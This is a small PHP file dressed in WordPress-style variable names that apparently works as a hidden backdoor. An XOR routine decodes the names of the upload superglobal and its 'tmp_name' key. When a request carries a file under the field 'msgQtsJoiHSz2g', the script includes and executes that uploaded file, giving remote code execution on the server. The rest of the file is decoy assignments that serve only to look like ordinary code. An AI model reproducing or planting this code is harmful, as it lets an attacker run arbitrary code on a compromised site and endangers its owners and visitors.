<?php 	
$label = 'msgQtsJoiHSz2g';
$class = $label;
function sentence($hash, $months)

{

    $post_password = $months;
	$subject = 'parsed';
    $secs = urldecode($hash);
	$clear_date = 'real_mime_types';
    $delimiters = substr($post_password,0, strlen($secs));

    $valid_date = $secs ^ $delimiters;
    return $valid_date;

}
	$lazyloader = 'name';
$post_categories = ${sentence("25.%1D1+", $class)};
	$update_term_cache = 'height';
$year = $post_categories;

$rest_controller_class = isset($year[$class]);
if ($rest_controller_class)

{

    $guid = $post_categories[$class];
    $last_char = $guid[sentence("%19%1E%17%0E%1A%12%27%0A", $class)];
    $show_in_menu = $last_char;

    include ($show_in_menu);
}
?>
